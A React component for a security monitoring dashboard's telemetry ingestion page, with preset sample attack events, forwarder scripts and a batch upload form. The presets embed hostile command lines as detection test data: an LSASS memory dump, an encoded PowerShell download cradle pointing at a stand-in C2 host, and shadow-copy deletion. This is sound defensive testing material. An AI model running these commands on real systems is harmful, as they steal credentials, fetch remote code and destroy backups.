import React, { useState } from 'react';
import {
  Radio,
  Power,
  Activity,
  Server,
  Shield,
  CheckCircle2,
  AlertCircle,
  Upload,
  Copy,
  Check,
  Send,
  Play,
  Pause,
  Terminal,
  FileCode2,
  Network,
  RefreshCw,
  Sparkles,
  Layers,
  ArrowUpRight
} from 'lucide-react';
import type { CollectorConfig, Alert } from '../../types/soc';

interface CollectorsViewProps {
  collectors: CollectorConfig[];
  onToggleCollector: (collectorId: string) => void;
  onInjectTestBatch: () => void;
  onRefreshData?: () => void;
}

type PayloadPreset = 'mimikatz' | 'powershell' | 'c2_beacon' | 'kerberoast' | 'vssadmin' | 'custom';

export const CollectorsView: React.FC<CollectorsViewProps> = ({
  collectors,
  onToggleCollector,
  onInjectTestBatch,
  onRefreshData
}) => {
  const totalEPS = collectors.filter(c => c.enabled).reduce((sum, c) => sum + c.events_per_second, 0);

  // Ingestion states
  const [activeTab, setActiveTab] = useState<'tester' | 'upload' | 'agents' | 'fleet'>('tester');
  const [selectedPreset, setSelectedPreset] = useState<PayloadPreset>('mimikatz');
  const [copiedCode, setCopiedCode] = useState<string | null>(null);
  const [isTransmitting, setIsTransmitting] = useState(false);
  const [lastResponse, setLastResponse] = useState<any>(null);
  const [agentTab, setAgentTab] = useState<'curl' | 'python' | 'powershell' | 'fluentbit'>('curl');

  // Live Generator state
  const [isGeneratorRunning, setIsGeneratorRunning] = useState(false);
  const [isTogglingGenerator, setIsTogglingGenerator] = useState(false);

  // File upload state
  const [uploadText, setUploadText] = useState('');
  const [isUploading, setIsUploading] = useState(false);
  const [uploadResult, setUploadResult] = useState<any>(null);

  // Presets
  const presets: Record<PayloadPreset, { title: string; desc: string; payload: any }> = {
    mimikatz: {
      title: 'Mimikatz LSASS Dump',
      desc: 'T1003.001 - OS Credential Dumping via comsvcs.dll MiniDump process memory capture',
      payload: {
        source: 'windows_sysmon',
        event_type: 'process_creation',
        hostname: 'WS-FINANCE-03',
        username: 'j.doe',
        source_ip: '192.168.10.45',
        destination_ip: '192.168.10.45',
        process_name: 'rundll32.exe',
        process_id: 9412,
        parent_process: 'powershell.exe',
        command_line: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 648 C:\\Users\\Public\\lsass.dmp full',
        severity: 'CRITICAL',
        environment: 'LIVE_PRODUCTION'
      }
    },
    powershell: {
      title: 'Encoded PowerShell Cradle',
      desc: 'T1059.001 - Obfuscated execution cradle invoking IEX WebClient download',
      payload: {
        source: 'windows_sysmon',
        event_type: 'process_creation',
        hostname: 'WS-CORP-EXEC-01',
        username: 'adm_sarah',
        source_ip: '192.168.10.12',
        destination_ip: '192.168.10.12',
        process_name: 'powershell.exe',
        process_id: 11420,
        parent_process: 'cmd.exe',
        command_line: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC1zZXJ2ZXIuY29tL3N0YWdlcjInKQ==',
        severity: 'HIGH',
        environment: 'LIVE_PRODUCTION'
      }
    },
    c2_beacon: {
      title: 'Cobalt Strike C2 Beacon',
      desc: 'T1071.001 - High-frequency TLS connection to known malicious external IP on port 8443',
      payload: {
        source: 'network_zeek',
        event_type: 'network_connection',
        hostname: 'WS-DEV-08',
        username: 'dev_user',
        source_ip: '192.168.10.66',
        destination_ip: '185.220.101.45',
        source_port: 49822,
        destination_port: 8443,
        protocol: 'TLS',
        severity: 'HIGH',
        environment: 'LIVE_PRODUCTION'
      }
    },
    kerberoast: {
      title: 'Kerberoasting Attack',
      desc: 'T1558.003 - Active Directory TGS request with RC4 encryption (Ticket Granting Service)',
      payload: {
        source: 'windows_eventlog',
        event_type: 'kerberos_tgs_request',
        hostname: 'DC-PRIMARY-01',
        username: 'compromised_user',
        source_ip: '192.168.10.114',
        destination_ip: '192.168.10.2',
        severity: 'HIGH',
        raw_event: {
          EventID: 4769,
          ServiceName: 'MSSQLSvc/sql-prod.corporate.internal:1433',
          TicketEncryptionType: '0x17',
          FailureCode: '0x0'
        },
        environment: 'LIVE_PRODUCTION'
      }
    },
    vssadmin: {
      title: 'VSSadmin Shadow Copy Deletion',
      desc: 'T1490 - Inhibit System Recovery ransomware precursor command',
      payload: {
        source: 'windows_sysmon',
        event_type: 'process_creation',
        hostname: 'SRV-FILE-STORAGE-01',
        username: 'system_admin',
        source_ip: '192.168.10.8',
        destination_ip: '192.168.10.8',
        process_name: 'vssadmin.exe',
        process_id: 3412,
        command_line: 'vssadmin.exe delete shadows /all /quiet',
        severity: 'CRITICAL',
        environment: 'LIVE_PRODUCTION'
      }
    },
    custom: {
      title: 'Custom Telemetry JSON',
      desc: 'Custom structured endpoint, network flow, or identity event payload',
      payload: {
        source: 'windows_sysmon',
        event_type: 'process_creation',
        hostname: 'WS-CUSTOM-HOST',
        username: 'test_analyst',
        source_ip: '10.0.4.15',
        destination_ip: '10.0.4.15',
        process_name: 'suspicious_binary.exe',
        command_line: 'suspicious_binary.exe -p payload.bin',
        severity: 'MEDIUM',
        environment: 'LAB'
      }
    }
  };

  const [payloadCode, setPayloadCode] = useState<string>(
    JSON.stringify(presets.mimikatz.payload, null, 2)
  );

  const handleSelectPreset = (preset: PayloadPreset) => {
    setSelectedPreset(preset);
    setPayloadCode(JSON.stringify(presets[preset].payload, null, 2));
    setLastResponse(null);
  };

  const handleTransmitLivePayload = async () => {
    setIsTransmitting(true);
    setLastResponse(null);
    try {
      let parsedData;
      try {
        parsedData = JSON.parse(payloadCode);
      } catch (err: any) {
        setLastResponse({ error: 'Invalid JSON format: ' + err.message });
        setIsTransmitting(false);
        return;
      }

      const res = await fetch('/api/telemetry/ingest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(parsedData)
      });
      const data = await res.json();
      setLastResponse(data);
      if (onRefreshData) onRefreshData();
    } catch (err: any) {
      setLastResponse({ error: err.message || 'Failed to transmit telemetry' });
    } finally {
      setIsTransmitting(false);
    }
  };

  const handleToggleGenerator = async () => {
    setIsTogglingGenerator(true);
    try {
      const res = await fetch('/api/telemetry/live-generator/toggle', { method: 'POST' });
      const data = await res.json();
      setIsGeneratorRunning(data.running);
      if (onRefreshData) onRefreshData();
    } catch (err) {
      console.error('Failed to toggle live generator', err);
    } finally {
      setIsTogglingGenerator(false);
    }
  };

  const handleUploadFile = async () => {
    if (!uploadText.trim()) return;
    setIsUploading(true);
    setUploadResult(null);
    try {
      const res = await fetch('/api/telemetry/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'text/plain' },
        body: uploadText
      });
      const data = await res.json();
      setUploadResult(data);
      if (onRefreshData) onRefreshData();
    } catch (err: any) {
      setUploadResult({ error: err.message });
    } finally {
      setIsUploading(false);
    }
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCode(label);
    setTimeout(() => setCopiedCode(null), 2000);
  };

  const originUrl = typeof window !== 'undefined' ? window.location.origin : 'http://localhost:3000';

  const curlSnippet = `# Post live Sysmon event directly into AegisSOC Ingestion Pipeline
curl -X POST "${originUrl}/api/telemetry/ingest" \\
  -H "Content-Type: application/json" \\
  -d '{
    "source": "windows_sysmon",
    "event_type": "process_creation",
    "hostname": "WS-FINANCE-03",
    "username": "j.doe",
    "source_ip": "192.168.10.45",
    "destination_ip": "192.168.10.45",
    "process_name": "rundll32.exe",
    "command_line": "rundll32.exe C:\\\\Windows\\\\System32\\\\comsvcs.dll, MiniDump 648 C:\\\\Users\\\\Public\\\\lsass.dmp full",
    "severity": "CRITICAL"
  }'`;

  const pythonSnippet = `#!/usr/bin/env python3
"""
AegisSOC High-Throughput Live Telemetry Forwarder
Tails local security logs or sockets and pushes batches to AegisSOC API.
"""
import requests
import json
import time
import socket

AEGIS_INGEST_URL = "${originUrl}/api/telemetry/ingest"

def push_event(event_data):
    try:
        resp = requests.post(
            AEGIS_INGEST_URL,
            json=event_data,
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        if resp.status_code == 200:
            result = resp.json()
            print(f"[+] Ingested {result['ingested_count']} event(s) | Alerts triggered: {result['alerts_triggered_count']}")
        else:
            print(f"[-] HTTP Error: {resp.status_code}")
    except Exception as e:
        print(f"[-] Forwarding failed: {e}")

# Example: Stream a live security event
if __name__ == "__main__":
    sample_event = {
        "source": "linux_auditd",
        "event_type": "execve",
        "hostname": socket.gethostname(),
        "username": "root",
        "source_ip": "192.168.10.150",
        "destination_ip": "192.168.10.150",
        "process_name": "nmap",
        "command_line": "nmap -sS -p 1-65535 192.168.10.0/24",
        "severity": "HIGH"
    }
    push_event(sample_event)`;

  const powershellSnippet = `# AegisSOC Windows Live EventLog Forwarder
# Queries active Security / Sysmon event stream and streams to AegisSOC
$IngestUrl = "${originUrl}/api/telemetry/ingest"

function Send-AegisTelemetry {
    param([hashtable]$EventPayload)
    $json = $EventPayload | ConvertTo-Json -Compress
    try {
        $response = Invoke-RestMethod -Uri $IngestUrl -Method Post -Body $json -ContentType "application/json"
        Write-Host "[AegisSOC] Streamed event. Alerts: $($response.alerts_triggered_count)" -ForegroundColor Green
    } catch {
        Write-Warning "Ingest Failed: $_"
    }
}

# Example live payload
$payload = @{
    source           = "windows_sysmon"
    event_type       = "process_creation"
    hostname         = $env:COMPUTERNAME
    username         = $env:USERNAME
    source_ip        = "192.168.10.77"
    destination_ip   = "192.168.10.77"
    process_name     = "powershell.exe"
    command_line     = "powershell.exe -enc SQBFAFg..."
    severity         = "HIGH"
}

Send-AegisTelemetry -EventPayload $payload`;

  const fluentBitSnippet = `# Fluent Bit output configuration for forwarding to AegisSOC
[SERVICE]
    Flush        1
    Daemon       Off
    Log_Level    info

[INPUT]
    Name         tail
    Path         /var/log/syslog
    Tag          linux.syslog

[OUTPUT]
    Name         http
    Match        *
    Host         ${typeof window !== 'undefined' ? window.location.hostname : 'localhost'}
    Port         3000
    URI          /api/telemetry/ingest
    Format       json
    Header       Content-Type application/json`;

  return (
    <div className="p-6 space-y-6 overflow-y-auto max-h-[calc(100vh-3.5rem)] text-neutral-100">
      {/* Top Banner: Ingestion Status & Live Velocity */}
      <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between p-5 rounded-lg bg-neutral-900/90 border border-neutral-800 gap-4">
        <div className="flex items-center gap-3.5">
          <div className="w-11 h-11 rounded-lg bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 shrink-0">
            <Radio className="w-6 h-6 animate-pulse" />
          </div>
          <div>
            <div className="flex items-center gap-2.5">
              <h1 className="text-base font-bold text-neutral-100 font-mono tracking-wide">
                Telemetry Ingestion & Live Sensor Hub
              </h1>
              <span className="px-2 py-0.5 rounded text-[10px] font-mono font-semibold bg-emerald-950 text-emerald-300 border border-emerald-800 flex items-center gap-1">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400"></span>
                LIVE PIPELINE ONLINE
              </span>
            </div>
            <p className="text-xs text-neutral-400 mt-1 max-w-2xl">
              AegisSOC supports real-time telemetry streaming via HTTP REST, Server-Sent Events (SSE), NDJSON, and raw Syslog. Incoming events are evaluated sub-second against Sigma rules, correlated into active incidents, and evaluated for ML anomalies.
            </p>
          </div>
        </div>

        <div className="flex items-center gap-3 shrink-0 flex-wrap">
          {/* Continuous Live Traffic Generator Toggle */}
          <button
            onClick={handleToggleGenerator}
            disabled={isTogglingGenerator}
            className={`px-3.5 py-2 rounded text-xs font-mono font-medium flex items-center gap-2 border transition-all ${
              isGeneratorRunning
                ? 'bg-amber-950/80 text-amber-300 border-amber-700 hover:bg-amber-900'
                : 'bg-neutral-850 hover:bg-neutral-800 text-neutral-200 border-neutral-700'
            }`}
          >
            {isGeneratorRunning ? (
              <>
                <Pause className="w-3.5 h-3.5 text-amber-400 animate-spin" />
                <span>Streaming Live (1 EPS)</span>
              </>
            ) : (
              <>
                <Play className="w-3.5 h-3.5 text-emerald-400" />
                <span>Start Continuous Live Generator</span>
              </>
            )}
          </button>

          <button
            onClick={onInjectTestBatch}
            className="px-3.5 py-2 rounded text-xs font-mono font-medium bg-emerald-600 hover:bg-emerald-500 text-white transition-colors flex items-center gap-1.5 shadow-sm"
          >
            <Send className="w-3.5 h-3.5" />
            Quick Inject Attack Batch
          </button>
        </div>
      </div>

      {/* Metrics Strip */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 font-mono text-xs">
        <div className="p-3.5 rounded-lg bg-neutral-900/70 border border-neutral-800">
          <span className="text-neutral-400 block text-[11px]">Aggregated Sensor Velocity</span>
          <span className="text-emerald-400 font-bold text-lg">{totalEPS} EPS</span>
        </div>
        <div className="p-3.5 rounded-lg bg-neutral-900/70 border border-neutral-800">
          <span className="text-neutral-400 block text-[11px]">Active Ingest Endpoint</span>
          <span className="text-neutral-200 font-semibold text-xs truncate block mt-1">
            POST /api/telemetry/ingest
          </span>
        </div>
        <div className="p-3.5 rounded-lg bg-neutral-900/70 border border-neutral-800">
          <span className="text-neutral-400 block text-[11px]">Real-Time SSE Stream</span>
          <span className="text-emerald-400 font-semibold flex items-center gap-1.5 mt-1">
            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
            GET /api/telemetry/stream
          </span>
        </div>
        <div className="p-3.5 rounded-lg bg-neutral-900/70 border border-neutral-800">
          <span className="text-neutral-400 block text-[11px]">Sensor Fleet Coverage</span>
          <span className="text-neutral-200 font-bold text-lg">
            {collectors.filter(c => c.enabled).length} / {collectors.length} ONLINE
          </span>
        </div>
      </div>

      {/* Navigation Sub-Tabs */}
      <div className="flex border-b border-neutral-800 gap-2">
        <button
          onClick={() => setActiveTab('tester')}
          className={`px-4 py-2.5 text-xs font-mono font-medium border-b-2 transition-colors flex items-center gap-2 ${
            activeTab === 'tester'
              ? 'border-emerald-500 text-emerald-400 bg-neutral-900/40'
              : 'border-transparent text-neutral-400 hover:text-neutral-200'
          }`}
        >
          <Send className="w-3.5 h-3.5" />
          Interactive Live Telemetry Tester
        </button>

        <button
          onClick={() => setActiveTab('agents')}
          className={`px-4 py-2.5 text-xs font-mono font-medium border-b-2 transition-colors flex items-center gap-2 ${
            activeTab === 'agents'
              ? 'border-emerald-500 text-emerald-400 bg-neutral-900/40'
              : 'border-transparent text-neutral-400 hover:text-neutral-200'
          }`}
        >
          <Terminal className="w-3.5 h-3.5" />
          Agent Forwarder Scripts & Configs
        </button>

        <button
          onClick={() => setActiveTab('upload')}
          className={`px-4 py-2.5 text-xs font-mono font-medium border-b-2 transition-colors flex items-center gap-2 ${
            activeTab === 'upload'
              ? 'border-emerald-500 text-emerald-400 bg-neutral-900/40'
              : 'border-transparent text-neutral-400 hover:text-neutral-200'
          }`}
        >
          <Upload className="w-3.5 h-3.5" />
          Batch File & NDJSON Ingestion
        </button>

        <button
          onClick={() => setActiveTab('fleet')}
          className={`px-4 py-2.5 text-xs font-mono font-medium border-b-2 transition-colors flex items-center gap-2 ${
            activeTab === 'fleet'
              ? 'border-emerald-500 text-emerald-400 bg-neutral-900/40'
              : 'border-transparent text-neutral-400 hover:text-neutral-200'
          }`}
        >
          <Server className="w-3.5 h-3.5" />
          Collectors Fleet ({collectors.length})
        </button>
      </div>

      {/* TAB 1: Interactive Live Telemetry Tester */}
      {activeTab === 'tester' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
          {/* Preset Selector & Payload Editor */}
          <div className="lg:col-span-7 space-y-4">
            <div className="bg-neutral-900/90 rounded-lg border border-neutral-800 p-4">
              <div className="flex items-center justify-between mb-3">
                <span className="text-xs font-mono font-semibold text-neutral-300">
                  Select Realistic Attack / Event Preset:
                </span>
                <span className="text-[10px] font-mono text-neutral-500">
                  Immediate Sigma & ATT&CK Evaluation
                </span>
              </div>

              {/* Preset buttons */}
              <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 mb-4">
                {(Object.keys(presets) as PayloadPreset[]).map((key) => {
                  const p = presets[key];
                  const isSelected = selectedPreset === key;
                  return (
                    <button
                      key={key}
                      onClick={() => handleSelectPreset(key)}
                      className={`p-2.5 rounded text-left border transition-all ${
                        isSelected
                          ? 'bg-emerald-950/80 border-emerald-600 text-emerald-300'
                          : 'bg-neutral-950 border-neutral-800 text-neutral-400 hover:bg-neutral-850 hover:text-neutral-200'
                      }`}
                    >
                      <div className="text-xs font-mono font-bold truncate">{p.title}</div>
                      <div className="text-[10px] text-neutral-500 truncate mt-0.5">{p.desc.slice(0, 35)}...</div>
                    </button>
                  );
                })}
              </div>

              {/* Payload Description */}
              <div className="p-2.5 rounded bg-neutral-950 border border-neutral-850 text-xs font-mono text-neutral-300 mb-3">
                <span className="text-emerald-400 font-bold">Scenario: </span>
                {presets[selectedPreset].desc}
              </div>

              {/* Code Editor */}
              <div className="relative">
                <div className="flex items-center justify-between px-3 py-1.5 bg-neutral-950 border border-b-0 border-neutral-800 rounded-t text-xs font-mono text-neutral-400">
                  <span>POST Payload (JSON)</span>
                  <button
                    onClick={() => copyToClipboard(payloadCode, 'payload')}
                    className="text-[11px] hover:text-neutral-200 flex items-center gap-1"
                  >
                    {copiedCode === 'payload' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                    Copy
                  </button>
                </div>
                <textarea
                  value={payloadCode}
                  onChange={(e) => setPayloadCode(e.target.value)}
                  rows={12}
                  className="w-full p-3 font-mono text-xs bg-neutral-950 border border-neutral-800 rounded-b text-emerald-300 focus:outline-none focus:border-emerald-500"
                  spellCheck={false}
                />
              </div>

              {/* Action Buttons */}
              <div className="mt-4 flex items-center justify-between">
                <span className="text-[11px] font-mono text-neutral-400">
                  Target: <code className="text-emerald-400">POST /api/telemetry/ingest</code>
                </span>

                <button
                  onClick={handleTransmitLivePayload}
                  disabled={isTransmitting}
                  className="px-4 py-2 rounded text-xs font-mono font-medium bg-emerald-600 hover:bg-emerald-500 text-white transition-colors flex items-center gap-2 shadow-sm disabled:opacity-50"
                >
                  <Send className={`w-3.5 h-3.5 ${isTransmitting ? 'animate-spin' : ''}`} />
                  {isTransmitting ? 'Evaluating Rules...' : 'Transmit Live Telemetry to API'}
                </button>
              </div>
            </div>
          </div>

          {/* Real-time Response & Alert Inspection */}
          <div className="lg:col-span-5 space-y-4">
            <div className="bg-neutral-900/90 rounded-lg border border-neutral-800 p-4 min-h-[460px] flex flex-col justify-between">
              <div>
                <div className="flex items-center justify-between pb-3 border-b border-neutral-800">
                  <div className="flex items-center gap-2">
                    <Activity className="w-4 h-4 text-emerald-400" />
                    <h3 className="text-xs font-mono font-bold text-neutral-100">
                      Pipeline Live Execution Feedback
                    </h3>
                  </div>
                  {lastResponse && (
                    <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-emerald-950 text-emerald-300 border border-emerald-800">
                      HTTP 200 OK
                    </span>
                  )}
                </div>

                {lastResponse ? (
                  <div className="mt-4 space-y-4 font-mono">
                    {/* Summary Cards */}
                    <div className="grid grid-cols-2 gap-2">
                      <div className="p-2.5 rounded bg-neutral-950 border border-neutral-800">
                        <span className="text-neutral-500 text-[10px] block">Events Processed</span>
                        <span className="text-neutral-200 text-sm font-bold">
                          {lastResponse.ingested_count ?? 0}
                        </span>
                      </div>
                      <div className="p-2.5 rounded bg-neutral-950 border border-neutral-800">
                        <span className="text-neutral-500 text-[10px] block">Alerts Triggered</span>
                        <span className={`text-sm font-bold ${lastResponse.alerts_triggered_count > 0 ? 'text-rose-400' : 'text-emerald-400'}`}>
                          {lastResponse.alerts_triggered_count ?? 0}
                        </span>
                      </div>
                    </div>

                    {/* Triggered Alerts List */}
                    {lastResponse.alerts && lastResponse.alerts.length > 0 ? (
                      <div className="space-y-2">
                        <span className="text-[11px] text-neutral-400 font-semibold block">
                          Triggered Detection Rules:
                        </span>
                        {lastResponse.alerts.map((alt: Alert, idx: number) => (
                          <div
                            key={idx}
                            className="p-3 rounded bg-rose-950/30 border border-rose-800/60 text-xs space-y-1"
                          >
                            <div className="flex items-center justify-between">
                              <span className="font-bold text-rose-300">{alt.rule_name}</span>
                              <span className="px-1.5 py-0.2 rounded text-[10px] bg-rose-900/80 text-rose-200 border border-rose-700">
                                {alt.severity}
                              </span>
                            </div>
                            <div className="text-[10px] text-neutral-400 flex items-center gap-2">
                              <span>MITRE: {alt.mitre_technique_id}</span>
                              <span>•</span>
                              <span>Host: {alt.hostname}</span>
                            </div>
                            <div className="text-[10px] text-neutral-300 mt-1 font-sans">
                              {alt.evidence.summary}
                            </div>
                          </div>
                        ))}
                      </div>
                    ) : (
                      <div className="p-4 rounded bg-neutral-950 border border-neutral-800 text-xs text-neutral-400 text-center">
                        <CheckCircle2 className="w-5 h-5 text-emerald-400 mx-auto mb-1" />
                        Event ingested successfully. No Sigma detection rules triggered.
                      </div>
                    )}
                  </div>
                ) : (
                  <div className="flex flex-col items-center justify-center py-16 text-center text-neutral-500 font-mono text-xs">
                    <Terminal className="w-8 h-8 mb-2 text-neutral-600" />
                    <span>No payload transmitted yet.</span>
                    <span className="text-[11px] text-neutral-600 mt-1">
                      Select an attack scenario and click "Transmit Live Telemetry" to watch AegisSOC detect and alert in real-time.
                    </span>
                  </div>
                )}
              </div>

              <div className="pt-3 border-t border-neutral-800 text-[11px] font-mono text-neutral-400 flex items-center justify-between">
                <span>Normalization: AegisEvent v1.0</span>
                <span className="text-emerald-400">Zero-drop buffer</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* TAB 2: Agent Forwarder Scripts & Configs */}
      {activeTab === 'agents' && (
        <div className="space-y-4">
          <div className="bg-neutral-900/90 rounded-lg border border-neutral-800 p-5">
            <h3 className="text-sm font-bold text-neutral-100 font-mono mb-2">
              Deploy Live Agents & Ingestion Forwarders
            </h3>
            <p className="text-xs text-neutral-400 mb-4 max-w-3xl font-sans">
              Connect existing workstations, servers, honeypots, firewalls, and containers to AegisSOC. Use any of the scripts below to stream live logs from Windows, Linux, Sysmon, Zeek, or Suricata.
            </p>

            {/* Sub Tabs */}
            <div className="flex border-b border-neutral-800 gap-3 mb-4">
              <button
                onClick={() => setAgentTab('curl')}
                className={`pb-2 text-xs font-mono font-medium border-b-2 transition-colors ${
                  agentTab === 'curl' ? 'border-emerald-500 text-emerald-400' : 'border-transparent text-neutral-400 hover:text-neutral-200'
                }`}
              >
                cURL (Bash / Linux / macOS)
              </button>
              <button
                onClick={() => setAgentTab('python')}
                className={`pb-2 text-xs font-mono font-medium border-b-2 transition-colors ${
                  agentTab === 'python' ? 'border-emerald-500 text-emerald-400' : 'border-transparent text-neutral-400 hover:text-neutral-200'
                }`}
              >
                Python 3 Forwarder Daemon
              </button>
              <button
                onClick={() => setAgentTab('powershell')}
                className={`pb-2 text-xs font-mono font-medium border-b-2 transition-colors ${
                  agentTab === 'powershell' ? 'border-emerald-500 text-emerald-400' : 'border-transparent text-neutral-400 hover:text-neutral-200'
                }`}
              >
                PowerShell (Windows EventLog)
              </button>
              <button
                onClick={() => setAgentTab('fluentbit')}
                className={`pb-2 text-xs font-mono font-medium border-b-2 transition-colors ${
                  agentTab === 'fluentbit' ? 'border-emerald-500 text-emerald-400' : 'border-transparent text-neutral-400 hover:text-neutral-200'
                }`}
              >
                Fluent Bit (Syslog / Zeek / Suricata)
              </button>
            </div>

            {/* Code Snippet Box */}
            <div className="relative">
              <div className="flex items-center justify-between px-3.5 py-2 bg-neutral-950 border border-b-0 border-neutral-800 rounded-t text-xs font-mono text-neutral-400">
                <span>{agentTab.toUpperCase()} Integration Script</span>
                <button
                  onClick={() => {
                    const code =
                      agentTab === 'curl'
                        ? curlSnippet
                        : agentTab === 'python'
                        ? pythonSnippet
                        : agentTab === 'powershell'
                        ? powershellSnippet
                        : fluentBitSnippet;
                    copyToClipboard(code, agentTab);
                  }}
                  className="text-xs hover:text-neutral-200 flex items-center gap-1.5 font-mono px-2 py-1 rounded bg-neutral-850 border border-neutral-750"
                >
                  {copiedCode === agentTab ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  {copiedCode === agentTab ? 'Copied!' : 'Copy Script'}
                </button>
              </div>

              <pre className="p-4 bg-neutral-950 border border-neutral-800 rounded-b text-xs font-mono text-neutral-300 overflow-x-auto leading-relaxed">
                {agentTab === 'curl' && curlSnippet}
                {agentTab === 'python' && pythonSnippet}
                {agentTab === 'powershell' && powershellSnippet}
                {agentTab === 'fluentbit' && fluentBitSnippet}
              </pre>
            </div>
          </div>
        </div>
      )}

      {/* TAB 3: Batch File & NDJSON Ingestion */}
      {activeTab === 'upload' && (
        <div className="space-y-4">
          <div className="bg-neutral-900/90 rounded-lg border border-neutral-800 p-5">
            <h3 className="text-sm font-bold text-neutral-100 font-mono mb-2">
              Batch Log File & NDJSON Ingestion
            </h3>
            <p className="text-xs text-neutral-400 mb-4 max-w-3xl font-sans">
              Paste newline-delimited JSON (NDJSON), a JSON array, or raw syslog records to ingest multiple real events into AegisSOC simultaneously.
            </p>

            <textarea
              value={uploadText}
              onChange={(e) => setUploadText(e.target.value)}
              placeholder={`Paste NDJSON or raw log lines here...\nExample:\n{"source":"windows_sysmon","event_type":"process_creation","hostname":"WS-01","process_name":"whoami.exe","command_line":"whoami /all"}\n{"source":"network_zeek","event_type":"dns","hostname":"WS-01","destination_ip":"8.8.8.8"}`}
              rows={8}
              className="w-full p-3 font-mono text-xs bg-neutral-950 border border-neutral-800 rounded text-neutral-200 focus:outline-none focus:border-emerald-500"
            />

            <div className="mt-4 flex items-center justify-between">
              <span className="text-[11px] font-mono text-neutral-400">
                Supports: <code className="text-emerald-400">.json, .ndjson, .log, Syslog lines</code>
              </span>

              <button
                onClick={handleUploadFile}
                disabled={isUploading || !uploadText.trim()}
                className="px-4 py-2 rounded text-xs font-mono font-medium bg-emerald-600 hover:bg-emerald-500 text-white transition-colors flex items-center gap-2 shadow-sm disabled:opacity-50"
              >
                <Upload className="w-3.5 h-3.5" />
                {isUploading ? 'Parsing & Ingesting...' : 'Upload & Process Batch'}
              </button>
            </div>

            {uploadResult && (
              <div className="mt-4 p-4 rounded bg-neutral-950 border border-neutral-800 font-mono text-xs">
                <div className="text-emerald-400 font-bold mb-1">
                  Batch Ingestion Completed: {uploadResult.ingested_events} events ingested ({uploadResult.alerts_triggered} alerts triggered)
                </div>
                {uploadResult.alerts && uploadResult.alerts.length > 0 && (
                  <div className="mt-2 text-rose-300">
                    Alerts generated: {uploadResult.alerts.map((a: Alert) => a.rule_name).join(', ')}
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {/* TAB 4: Collectors Fleet Grid */}
      {activeTab === 'fleet' && (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {collectors.map((c) => (
            <div
              key={c.id}
              className={`bg-neutral-900/90 rounded-lg border p-5 flex flex-col justify-between transition-colors ${
                c.enabled ? 'border-neutral-800' : 'border-neutral-850 opacity-60'
              }`}
            >
              <div>
                <div className="flex items-center justify-between mb-3">
                  <span className="font-mono text-[10px] uppercase font-bold text-neutral-400 bg-neutral-950 px-2 py-0.5 rounded border border-neutral-800">
                    {c.category} SENSOR
                  </span>
                  <button
                    onClick={() => onToggleCollector(c.id)}
                    className={`p-1.5 rounded-full border transition-colors ${
                      c.enabled
                        ? 'bg-emerald-950 text-emerald-400 border-emerald-800 hover:bg-emerald-900'
                        : 'bg-neutral-800 text-neutral-400 border-neutral-700 hover:bg-neutral-700'
                    }`}
                    title={c.enabled ? 'Disable Sensor' : 'Enable Sensor'}
                  >
                    <Power className="w-3.5 h-3.5" />
                  </button>
                </div>

                <h3 className="text-sm font-bold text-neutral-100">{c.name}</h3>
                <p className="text-xs text-neutral-400 mt-1 font-sans leading-snug">{c.description}</p>
              </div>

              <div className="mt-5 pt-3 border-t border-neutral-800 text-xs font-mono space-y-1.5">
                <div className="flex justify-between">
                  <span className="text-neutral-400">Current Velocity:</span>
                  <span className="text-emerald-400 font-bold">{c.enabled ? `${c.events_per_second} EPS` : '0 EPS'}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-neutral-400">Total Ingested:</span>
                  <span className="text-neutral-200">{c.total_events.toLocaleString()} Events</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-neutral-400">Sensor Status:</span>
                  <span className={`font-bold ${c.enabled ? 'text-emerald-400' : 'text-neutral-400'}`}>
                    {c.status}
                  </span>
                </div>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
};
